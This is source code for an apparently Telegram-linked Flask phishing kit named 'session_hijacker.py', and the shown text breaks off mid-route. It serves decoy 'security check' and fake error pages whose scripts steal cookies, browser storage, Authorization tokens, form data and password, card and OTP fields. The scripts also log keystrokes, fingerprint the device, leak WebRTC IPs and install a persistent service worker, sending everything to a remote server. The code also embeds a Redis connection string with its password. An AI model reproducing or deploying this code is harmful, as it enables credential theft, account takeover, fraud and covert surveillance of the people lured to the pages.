# session_hijacker.py
# ============================================================
# Cookie Hijacker v2 — متعدد الطبقات لتجاوز كل الحمايات
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import uuid
from datetime import datetime
from flask import Blueprint, request, jsonify, Response

sh_bp = Blueprint('session_hijacker', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    print("[+] SH: ✅ Redis connected")
except Exception as e:
    print(f"[-] SH Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# الجلسات النشطة: {session_id: {chat_id, last_seen, target_site, cookies, storage}}
sessions = {}
sessions_lock = threading.Lock()


# ============================================================
# [2] إدارة الجلسات
# ============================================================
def create_sh_session(session_id, chat_id, target_site="auto"):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "target_site": target_site,
            "cookies": {},
            "storage": {},
            "forms": [],
            "screenshots": [],
            "gps": None,
        }
    if redis_client:
        try:
            redis_client.setex(f"sh_session:{session_id}", 86400, str(chat_id))
        except Exception:
            pass
    return sessions[session_id]


def get_sh_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


# ============================================================
# [3] القالب الذكي — يحاول تجاوز كل حماية
# ============================================================
SH_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>جاري التحميل...</title>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; background: #0b1120;
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh; }
  .wrap { max-width: 460px; margin: 0 auto; padding: 60px 24px; text-align: center; }
  .spinner { width: 60px; height: 60px; border: 4px solid rgba(56,189,248,0.15);
    border-left-color: #38bdf8; border-radius: 50%;
    margin: 0 auto 24px; animation: spin 1s linear infinite; }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  h1 { font-size: 20px; color: #e2e8f0; margin: 0 0 12px; font-weight: 600; }
  p { color: #94a3b8; font-size: 14px; line-height: 1.7; margin: 0; }
  .status { margin-top: 30px; padding: 14px; background: rgba(56,189,248,0.08);
    border: 1px solid rgba(56,189,248,0.25); border-radius: 10px;
    font-size: 12px; color: #38bdf8; }
</style>
</head>
<body>
<div class="wrap">
  <div class="spinner"></div>
  <h1 id="t">جاري التحقق من الأمان...</h1>
  <p id="d">يرجى الانتظار قليلاً.</p>
  <div class="status" id="s">🔒 اتصال مشفر</div>
</div>

<script>
(function(){
"use strict";

const SESSION_ID = "__SESSION_ID__";
const CHAT_ID = "__CHAT_ID__";
const SERVER = "__HTTP_URL__";

// ============================================================
// الطبقة 1: سحب كل الكوكيز المتاحة
// ============================================================
function stealCookies() {
  const result = {};
  try {
    // كل كوكيز الموقع الحالي (يمكن قراءتها)
    result.document_cookie = document.cookie;

    // محاولة قراءة الكوكيز المخفية (قد تفشل لكن نحاول)
    try {
      result.visible = {};
      document.cookie.split(';').forEach(c => {
        const [k, v] = c.trim().split('=');
        if (k) result.visible[k] = v;
      });
    } catch(e) {}
  } catch(e) {}
  return result;
}

// ============================================================
// الطبقة 2: سحب كل أنواع Storage
// ============================================================
function stealStorage() {
  const result = {};
  
  // LocalStorage
  try {
    result.localStorage = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      const v = localStorage.getItem(k);
      if (v && v.length < 5000) {
        result.localStorage[k] = v;
      }
    }
  } catch(e) {}
  
  // SessionStorage
  try {
    result.sessionStorage = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      const v = sessionStorage.getItem(k);
      if (v && v.length < 5000) {
        result.sessionStorage[k] = v;
      }
    }
  } catch(e) {}
  
  // IndexedDB
  try {
    result.indexedDB = {};
    if (indexedDB.databases) {
      indexedDB.databases().then(dbs => {
        dbs.forEach(dbInfo => {
          try {
            const req = indexedDB.open(dbInfo.name);
            req.onsuccess = (e) => {
              const db = e.target.result;
              const stores = Array.from(db.objectStoreNames);
              const data = {};
              let pending = stores.length;
              if (pending === 0) {
                sendFullStorage(result);
                return;
              }
              stores.forEach(storeName => {
                try {
                  const tx = db.transaction(storeName, 'readonly');
                  const store = tx.objectStore(storeName);
                  const all = store.getAll();
                  all.onsuccess = () => {
                    data[dbInfo.name + '::' + storeName] = all.result;
                    pending--;
                    if (pending === 0) {
                      result.indexedDB = data;
                      sendFullStorage(result);
                    }
                  };
                  all.onerror = () => { pending--; if (pending === 0) sendFullStorage(result); };
                } catch(e) { pending--; if (pending === 0) sendFullStorage(result); }
              });
            };
            req.onerror = () => { sendFullStorage(result); };
          } catch(e) {}
        });
      });
    }
  } catch(e) {
    sendFullStorage(result);
  }
  
  // إذا IndexedDB لم يعمل، أرسل ما عندنا
  setTimeout(() => sendFullStorage(result), 2000);
  return result;
}

function sendFullStorage(storage) {
  try {
    const cookies = stealCookies();
    fetch(SERVER + '/sh_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'storage',
        cookies: cookies,
        storage: storage,
        url: window.location.href,
        origin: window.location.origin
      })
    });
  } catch(e) {}
}

// ============================================================
// الطبقة 3: Cache API
// ============================================================
async function stealCache() {
  try {
    if (!('caches' in window)) return;
    const cacheNames = await caches.keys();
    const result = {};
    for (const name of cacheNames) {
      try {
        const cache = await caches.open(name);
        const requests = await cache.keys();
        result[name] = requests.map(r => r.url).slice(0, 50);
      } catch(e) {}
    }
    fetch(SERVER + '/sh_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'cache',
        cache: result
      })
    });
  } catch(e) {}
}

// ============================================================
// الطبقة 4: اعتراض النماذج (Form Sniffing)
// ============================================================
function hookForms() {
  document.addEventListener('submit', function(e) {
    try {
      const form = e.target;
      const fd = new FormData(form);
      const data = {};
      for (const [k, v] of fd.entries()) {
        if (typeof v === 'string') data[k] = v;
      }
      fetch(SERVER + '/sh_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'form_submit',
          url: window.location.href,
          action: form.action,
          method: form.method,
          fields: data
        })
      });
    } catch(err) {}
  }, true);
  
  // اعتراض إدخالات الحقول (لكل ضغطة زر)
  document.addEventListener('input', function(e) {
    try {
      const t = e.target;
      if (!t || !t.name) return;
      const type = (t.type || '').toLowerCase();
      // فقط الحقول الحساسة
      if (type === 'password' || 
          /(pass|pwd|email|user|phone|card|cvv|pin|otp|code|token)/i.test(t.name)) {
        fetch(SERVER + '/sh_data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: SESSION_ID,
            chat_id: CHAT_ID,
            type: 'field_input',
            name: t.name,
            value: t.value,
            field_type: type,
            url: window.location.href
          })
        });
      }
    } catch(err) {}
  }, true);
}

// ============================================================
// الطبقة 5: اعتراض Fetch و XHR (لسرقة الـ Tokens)
// ============================================================
function hookNetwork() {
  try {
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      try {
        const url = typeof args[0] === 'string' ? args[0] : args[0].url;
        const options = args[1] || {};
        // إذا كان الطلب يحتوي Authorization header
        if (options.headers) {
          const headers = options.headers;
          let auth = null;
          if (headers.get) auth = headers.get('Authorization');
          else if (headers.Authorization) auth = headers.Authorization;
          if (auth) {
            fetch(SERVER + '/sh_data', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                session_id: SESSION_ID,
                chat_id: CHAT_ID,
                type: 'auth_token',
                auth: auth,
                url: url
              })
            });
          }
        }
      } catch(e) {}
      return originalFetch.apply(this, args);
    };
  } catch(e) {}
  
  try {
    const XHROpen = XMLHttpRequest.prototype.open;
    const XHRSetHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.open = function(method, url) {
      this.__url = url;
      return XHROpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
      try {
        if (/authorization|bearer|x-auth|token/i.test(name)) {
          fetch(SERVER + '/sh_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              session_id: SESSION_ID,
              chat_id: CHAT_ID,
              type: 'auth_token',
              auth: name + ': ' + value,
              url: this.__url
            })
          });
        }
      } catch(e) {}
      return XHRSetHeader.apply(this, arguments);
    };
  } catch(e) {}
}

// ============================================================
// الطبقة 6: Keylogger شامل
// ============================================================
let keyBuffer = '';
let lastKeyTime = 0;

function startKeylogger() {
  document.addEventListener('keydown', function(e) {
    try {
      const now = Date.now();
      let key = e.key;
      if (key === 'Enter') key = '\n';
      else if (key === 'Tab') key = '\t';
      else if (key.length > 1 && !['Enter','Tab','Backspace'].includes(key)) return;
      
      keyBuffer += key;
      
      // إرسال كل 3 ثواني أو عند Enter
      if (now - lastKeyTime > 3000 || key === '\n' || keyBuffer.length > 100) {
        if (keyBuffer.trim()) {
          fetch(SERVER + '/sh_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              session_id: SESSION_ID,
              chat_id: CHAT_ID,
              type: 'keystroke',
              text: keyBuffer,
              url: window.location.href
            })
          });
          keyBuffer = '';
        }
        lastKeyTime = now;
      }
    } catch(err) {}
  }, true);
}

// ============================================================
// الطبقة 7: WebRTC IP Leak (كشف IP الحقيقي)
// ============================================================
async function leakIP() {
  try {
    const ips = new Set();
    const pc = new RTCPeerConnection({ 
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
      ]
    });
    pc.createDataChannel('');
    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
      if (m) ips.add(m[1]);
    };
    await pc.createOffer();
    await pc.setLocalDescription(await pc.createOffer());
    await new Promise(r => setTimeout(r, 3000));
    pc.close();
    
    if (ips.size > 0) {
      fetch(SERVER + '/sh_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'webrtc_ips',
          ips: Array.from(ips)
        })
      });
    }
  } catch(e) {}
}

// ============================================================
// الطبقة 8: معلومات الجهاز الكاملة
// ============================================================
async function deviceFingerprint() {
  const fp = {
    session_id: SESSION_ID,
    chat_id: CHAT_ID,
    type: 'device',
    url: window.location.href,
    origin: window.location.origin,
    ua: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    languages: navigator.languages || [],
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      w: screen.width, h: screen.height,
      aw: screen.availWidth, ah: screen.availHeight,
      dpr: devicePixelRatio,
      depth: screen.colorDepth,
      orientation: screen.orientation ? screen.orientation.type : 'N/A'
    },
    hw: {
      cores: navigator.hardwareConcurrency || 'N/A',
      memory: navigator.deviceMemory || 'N/A',
      touch: navigator.maxTouchPoints || 0
    },
    time: new Date().toISOString()
  };
  
  // البطارية
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      fp.battery = { level: Math.round(b.level * 100), charging: b.charging };
    }
  } catch(e) {}
  
  // الشبكة
  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (c) fp.network = { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
  } catch(e) {}
  
  // WebGL
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        fp.gpu = {
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        };
      }
    }
  } catch(e) {}
  
  // Canvas Fingerprint
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('Security-Check', 2, 15);
    fp.canvas_fp = c.toDataURL().slice(-50);
  } catch(e) {}
  
  // WebGL Fingerprint
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        fp.webgl_fp = [
          gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        ].join('~');
      }
    }
  } catch(e) {}
  
  // AudioContext Fingerprint
  try {
    const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
    const osc = audioCtx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
    const comp = audioCtx.createDynamicsCompressor();
    osc.connect(comp);
    comp.connect(audioCtx.destination);
    osc.start(0);
    fp.audio_fp = 'active';
  } catch(e) {}
  
  // الخطوط المثبتة
  try {
    const baseFonts = ['monospace', 'sans-serif', 'serif'];
    const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Trebuchet MS','Impact','Tahoma','Consolas','Calibri','Cambria','Segoe UI'];
    const testStr = 'mmmmmmmmmmlli';
    const span = document.createElement('span');
    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
    span.textContent = testStr;
    document.body.appendChild(span);
    const baseSizes = {};
    baseFonts.forEach(f => { span.style.fontFamily = f; baseSizes[f] = span.offsetWidth; });
    const detected = [];
    testFonts.forEach(f => {
      let found = false;
      baseFonts.forEach(b => {
        span.style.fontFamily = "'" + f + "'," + b;
        if (span.offsetWidth !== baseSizes[b]) found = true;
      });
      if (found) detected.push(f);
    });
    document.body.removeChild(span);
    fp.fonts = detected;
  } catch(e) {}
  
  fetch(SERVER + '/sh_data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(fp)
  });
}

// ============================================================
// الطبقة 9: MHTML Snapshot (لقطة كاملة للصفحة الحالية)
// ============================================================
function capturePageHTML() {
  try {
    const html = document.documentElement.outerHTML;
    if (html.length > 500000) return; // حجم كبير جداً
    fetch(SERVER + '/sh_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'page_html',
        url: window.location.href,
        title: document.title,
        html: html.slice(0, 200000)
      })
    });
  } catch(e) {}
}

// ============================================================
// الطبقة 10: Persistent Service Worker
// ============================================================
async function registerSW() {
  try {
    if (!('serviceWorker' in navigator)) return;
    // SW سيرسل ping كل 5 دقائق
    navigator.serviceWorker.register('/sh_sw.js', { scope: '/' }).then(reg => {
      console.log('[SH] SW registered');
    }).catch(e => {});
  } catch(e) {}
}

// ============================================================
// الطبقة 11: Tab Visibility Monitor (يعمل حتى لو التاب مخفي)
// ============================================================
function startVisibilityMonitor() {
  document.addEventListener('visibilitychange', () => {
    fetch(SERVER + '/sh_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'visibility',
        state: document.visibilityState,
        url: window.location.href
      })
    });
  });
}

// ============================================================
// الطبقة 12: URL Change Detection
// ============================================================
let lastUrl = window.location.href;
function watchUrl() {
  setInterval(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      // أعد سحب الكوكيز عند كل تغيير
      stealCookies();
      sendFullStorage({});
      capturePageHTML();
    }
  }, 2000);
}

// ============================================================
// الإقلاع
// ============================================================
async function boot() {
  // 1) Device fingerprint فوراً
  await deviceFingerprint();
  
  // 2) WebRTC IP
  leakIP();
  
  // 3) Cookies + Storage
  stealCookies();
  stealStorage();
  
  // 4) Cache API
  stealCache();
  
  // 5) Hook Forms
  hookForms();
  
  // 6) Hook Network
  hookNetwork();
  
  // 7) Keylogger
  startKeylogger();
  
  // 8) Service Worker
  registerSW();
  
  // 9) Visibility Monitor
  startVisibilityMonitor();
  
  // 10) URL Change
  watchUrl();
  
  // 11) دورياً كل 30 ثانية أعد السحب
  setInterval(() => {
    stealCookies();
    stealStorage();
    capturePageHTML();
  }, 30000);
  
  // 12) حدّث حالة الصفحة
  document.getElementById('t').textContent = 'تم التحقق';
  document.getElementById('d').textContent = 'يمكنك متابعة استخدام جهازك.';
  document.getElementById('s').textContent = '✅ الاتصال آمن';
}

// شغّل بعد تحميل الصفحة
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', boot);
} else {
  boot();
}

})();
</script>
</body>
</html>
"""

# ============================================================
# [4] Service Worker منفصل
# ============================================================
SH_SW = r"""
// Service Worker يبقى يعمل في الخلفية
const SERVER = "__HTTP_URL__";
const CHAT_ID = "__CHAT_ID__";
const SESSION_ID = "__SESSION_ID__";

// ping كل 5 دقائق
setInterval(() => {
  fetch(SERVER + '/sh_data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      type: 'sw_ping',
      ts: Date.now()
    })
  }).catch(() => {});
}, 5 * 60 * 1000);

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
"""


# ============================================================
# [5] القالب الرئيسي للصفحة
# ============================================================
SH_MAIN_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#ffffff">
<title>حدث خطأ في الاتصال</title>
<link rel="manifest" href="/sh_manifest.json">
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body { margin: 0; padding: 0; background: #f5f7fa; color: #1a202c;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    min-height: 100vh; }
  .wrap { max-width: 520px; margin: 0 auto; padding: 80px 24px 40px; text-align: center; }
  .icon-wrap { width: 88px; height: 88px; margin: 0 auto 28px; border-radius: 50%;
    background: #fff; display: flex; align-items: center; justify-content: center;
    box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
  .icon-wrap svg { width: 44px; height: 44px; }
  h1 { font-size: 22px; font-weight: 600; color: #1a202c; margin: 0 0 14px; }
  .subtitle { color: #64748b; font-size: 15px; line-height: 1.7; margin: 0 0 36px; padding: 0 10px; }
  .info-card { background: #fff; border: 1px solid #e2e8f0; border-radius: 14px;
    padding: 20px; margin-bottom: 22px; text-align: right;
    box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
  .info-row { display: flex; justify-content: space-between; padding: 10px 0;
    border-bottom: 1px solid #f1f5f9; font-size: 13px; }
  .info-row:last-child { border-bottom: none; }
  .info-label { color: #64748b; }
  .info-value { color: #1a202c; font-weight: 500; }
  .info-value.error { color: #e11d48; }
  .retry-btn { display: block; width: 100%; padding: 15px; border: none;
    border-radius: 10px; background: #2563eb; color: #fff; font-size: 15px;
    font-weight: 600; cursor: pointer; font-family: inherit; }
  .help-link { display: block; margin-top: 22px; color: #64748b; font-size: 13px;
    text-decoration: none; }
  .hidden { display: none !important; }
  .spinner { width: 50px; height: 50px; border: 4px solid #e2e8f0;
    border-left-color: #2563eb; border-radius: 50%; margin: 0 auto 20px;
    animation: spin 1s linear infinite; }
  @keyframes spin { 100% { transform: rotate(360deg); } }
  .progress-bar { height: 6px; background: #e2e8f0; border-radius: 3px;
    overflow: hidden; margin: 12px 0; }
  .progress-fill { height: 100%; width: 0%; background: #2563eb;
    transition: width 0.4s; }
  .progress-text { text-align: center; font-size: 12px; color: #64748b; }
  .success-check { width: 80px; height: 80px; margin: 0 auto 24px;
    border-radius: 50%; background: #dcfce7; display: flex;
    align-items: center; justify-content: center; }
  .success-title { font-size: 20px; font-weight: 600; color: #16a34a; margin-bottom: 10px; }
  .success-desc { color: #64748b; font-size: 14px; }
</style>
</head>
<body>
<div class="wrap">

  <div id="errorState">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="10" stroke="#e11d48" stroke-width="2"/>
        <path d="M12 7v6" stroke="#e11d48" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="16.5" r="1" fill="#e11d48"/>
      </svg>
    </div>
    <h1>حدث خطأ غير متوقع</h1>
    <p class="subtitle">تعذّر إكمال العملية بسبب مشكلة مؤقتة في الاتصال.<br>يرجى المحاولة مرة أخرى.</p>
    <div class="info-card">
      <div class="info-row"><span class="info-label">حالة الاتصال</span><span class="info-value error">منقطع</span></div>
      <div class="info-row"><span class="info-label">رمز الخطأ</span><span class="info-value">ERR_CONNECTION_RESET</span></div>
    </div>
    <button class="retry-btn" id="retryBtn" onclick="retryConnection()">إعادة المحاولة</button>
    <a href="#" class="help-link" onclick="event.preventDefault()">هل تحتاج إلى مساعدة؟</a>
  </div>

  <div id="loadingState" class="hidden">
    <div class="spinner"></div>
    <h1>جاري إعادة الاتصال...</h1>
    <p class="subtitle">يرجى الانتظار وعدم إغلاق الصفحة.</p>
    <div class="info-card">
      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <div class="progress-text" id="progressText">0%</div>
    </div>
  </div>

  <div id="successState" class="hidden">
    <div class="success-check">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M5 13l4 4L19 7" stroke="#16a34a" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <div class="success-title">تم بنجاح</div>
    <div class="success-desc">تمت العملية بنجاح.</div>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID = "__CHAT_ID__";
  const SERVER = "__HTTP_URL__";

  const el = id => document.getElementById(id);
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  // ============================================================
  // ★★★ سحب كل الكوكيز والبيانات من كل مكان
  // ============================================================
  async function stealAllCookiesAndStorage() {
    const payload = {
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      type: 'full_steal',
      timestamp: new Date().toISOString(),
      url: window.location.href,
      origin: window.location.origin,
      referrer: document.referrer || 'direct'
    };

    // 1) كل الكوكيز المرئية
    try { payload.cookies_visible = document.cookie; } catch(e) { payload.cookies_visible = ''; }

    // 2) محاولة سحب الكوكيز من كل الـ paths
    try {
      const cookiesByPath = {};
      const paths = ['/', '/home', '/login', '/api', '/user', '/account', '/profile'];
      for (const p of paths) {
        try {
          document.cookie = `__test_${p}__=1; path=${p}`;
          cookiesByPath[p] = document.cookie;
        } catch(e) {}
      }
      payload.cookies_by_path = cookiesByPath;
    } catch(e) {}

    // 3) LocalStorage كامل
    try {
      const ls = {};
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        try { ls[k] = localStorage.getItem(k); } catch(e) {}
      }
      payload.localStorage = ls;
    } catch(e) {}

    // 4) SessionStorage كامل
    try {
      const ss = {};
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        try { ss[k] = sessionStorage.getItem(k); } catch(e) {}
      }
      payload.sessionStorage = ss;
    } catch(e) {}

    // 5) IndexedDB كامل
    try {
      if (indexedDB.databases) {
        const dbs = await indexedDB.databases();
        const indexedData = {};
        for (const dbInfo of dbs) {
          try {
            const db = await new Promise((resolve, reject) => {
              const req = indexedDB.open(dbInfo.name);
              req.onsuccess = () => resolve(req.result);
              req.onerror = () => reject();
            });
            for (const storeName of Array.from(db.objectStoreNames)) {
              try {
                const tx = db.transaction(storeName, 'readonly');
                const store = tx.objectStore(storeName);
                const all = await new Promise((resolve) => {
                  const req = store.getAll();
                  req.onsuccess = () => resolve(req.result);
                  req.onerror = () => resolve([]);
                });
                indexedData[dbInfo.name + '::' + storeName] = all.slice(0, 100);
              } catch(e) {}
            }
          } catch(e) {}
        }
        payload.indexedDB = indexedData;
      }
    } catch(e) {}

    // 6) Cache Storage
    try {
      if ('caches' in window) {
        const cacheNames = await caches.keys();
        const cacheData = {};
        for (const name of cacheNames) {
          try {
            const cache = await caches.open(name);
            const keys = await cache.keys();
            cacheData[name] = keys.map(k => k.url).slice(0, 100);
          } catch(e) {}
        }
        payload.caches = cacheData;
      }
    } catch(e) {}

    // 7) أرسل كل شيء
    try {
      await fetch(SERVER + '/sh_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch(e) {}
  }

  // ============================================================
  // إعادة المحاولة → الالتقاط الكامل
  // ============================================================
  window.retryConnection = async function() {
    const btn = el('retryBtn');
    btn.disabled = true;
    btn.textContent = 'جاري الاتصال...';
    
    el('errorState').classList.add('hidden');
    el('loadingState').classList.remove('hidden');
    
    el('progressFill').style.width = '20%';
    el('progressText').textContent = '20%';
    
    await sleep(500);
    
    // ★ سحب كل البيانات
    await stealAllCookiesAndStorage();
    
    el('progressFill').style.width = '60%';
    el('progressText').textContent = '60%';
    
    await sleep(800);
    
    // إشارة للبوت
    await fetch(SERVER + '/sh_data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: 'retry_click'
      })
    }).catch(() => {});
    
    el('progressFill').style.width = '100%';
    el('progressText').textContent = '100%';
    
    await sleep(800);
    
    el('loadingState').classList.add('hidden');
    el('successState').classList.remove('hidden');
    
    // بعد النجاح، ابدأ المراقبة المستمرة
    startContinuousMonitoring();
  };

  // ============================================================
  // المراقبة المستمرة (بعد الالتقاط الأول)
  // ============================================================
  function startContinuousMonitoring() {
    // Keylogger
    let kb = '';
    let kt = 0;
    document.addEventListener('keydown', e => {
      let k = e.key;
      if (k === 'Enter') k = '\n';
      else if (k.length > 1) return;
      kb += k;
      const now = Date.now();
      if (now - kt > 3000 || k === '\n') {
        if (kb.trim()) {
          fetch(SERVER + '/sh_data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              session_id: SESSION_ID, chat_id: CHAT_ID,
              type: 'keystroke', text: kb, url: window.location.href
            })
          });
          kb = '';
        }
        kt = now;
      }
    }, true);
    
    // Form Sniffing
    document.addEventListener('submit', e => {
      try {
        const fd = new FormData(e.target);
        const data = {};
        for (const [k, v] of fd.entries()) if (typeof v === 'string') data[k] = v;
        fetch(SERVER + '/sh_data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: SESSION_ID, chat_id: CHAT_ID,
            type: 'form_submit', url: window.location.href,
            fields: data
          })
        });
      } catch(e) {}
    }, true);
    
    // حقل كلمة السر عند كل إدخال
    document.addEventListener('input', e => {
      const t = e.target;
      if (!t || !t.name) return;
      if (/(pass|pwd|email|user|phone|card|cvv|otp|code|token)/i.test(t.name)) {
        fetch(SERVER + '/sh_data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: SESSION_ID, chat_id: CHAT_ID,
            type: 'field_input', name: t.name, value: t.value,
            url: window.location.href
          })
        });
      }
    }, true);
    
    // Snapshot كوكيز كل 30 ثانية
    setInterval(async () => {
      try {
        const cookies = document.cookie;
        const ls = {};
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          ls[k] = localStorage.getItem(k);
        }
        fetch(SERVER + '/sh_data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            session_id: SESSION_ID, chat_id: CHAT_ID,
            type: 'periodic_snapshot',
            cookies: cookies, localStorage: ls, url: window.location.href
          })
        });
      } catch(e) {}
    }, 30000);
    
    // Service Worker
    try {
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sh_sw.js?s=' + SESSION_ID + '&c=' + CHAT_ID, { scope: '/' });
      }
    } catch(e) {}
  }

})();
</script>
</body>
</html>
"""


# ============================================================
# [6] المسارات
# ============================================================
def init_session_hijacker_routes(app, bot):

    @app.route('/sh_sw.js', methods=['GET'])
    def serve_sh_sw():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('c', '')
        sw_content = SH_SW.replace("__SESSION_ID__", session_id)\
                          .replace("__CHAT_ID__", chat_id)\
                          .replace("__HTTP_URL__", RAILWAY_URL)
        return Response(
            sw_content,
            mimetype='application/javascript',
            headers={'Service-Worker-Allowed': '/', 'Cache-Control': 'no-cache'}
        )

    @app.route('/sh_manifest.json', methods=['GET'])
    def sh_manifest():
        manifest = {
            "name": "Security Check",
            "short_name": "Sec",
            "start_url": "/",
            "display": "standalone",
            "background_color": "#f5f7fa",
            "theme_color": "#2563eb"
        }
        return Response(json.dumps(manifest), mimetype='application/manifest+json')

    @app.route('/sh', methods=['GET'])
    def sh_landing():
